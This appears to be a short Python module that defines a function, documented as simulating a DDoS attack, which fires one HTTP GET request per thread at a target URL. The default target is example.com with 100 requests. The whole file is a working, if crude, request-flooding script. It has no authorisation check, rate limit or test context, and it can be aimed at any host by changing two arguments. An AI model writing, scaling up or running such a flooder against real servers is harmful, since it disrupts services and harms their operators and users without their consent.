import requests
import threading

def run(target="http://example.com", requests_count=100):
    """Simulate a DDoS attack."""
    def send_request():
        try:
            requests.get(target)
        except:
            pass

    threads = []
    for _ in range(requests_count):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

    return {"target": target, "requests_sent": requests_count}
